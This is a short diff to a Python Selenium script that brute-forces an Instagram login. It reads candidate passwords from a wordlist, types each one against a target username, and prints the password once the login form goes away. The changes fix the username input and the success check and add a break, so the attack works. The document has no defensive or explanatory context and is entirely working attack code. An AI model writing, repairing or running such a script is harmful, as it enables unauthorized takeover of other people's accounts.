@@ -19,7 +19,7 @@ with open('wordlist.txt',"r") as pass_file:
 driver.get(url="https://www.instagram.com/")
 time.sleep(2)
 name=driver.find_element(By.NAME,"username")
-name.send_keys()
+name.send_keys(insta_id)
 time.sleep(2)
 n=1
 fill=driver.find_element(By.NAME,"password")
@@ -30,9 +30,10 @@ for password in line_list:
         time.sleep(2)
         n+=1
     time.sleep(0.5)
-    if not is_element_present(By.XPATH,'//*[@id="loginForm"]/span/div'):
+    if not is_element_present(By.NAME,"password"):
         print(f"Your Password is {password}")
+        break
     else:
         for i in range(len(password)):
             fill.send_keys(Keys.BACKSPACE)
-
+print(f"Your Password is {password}")
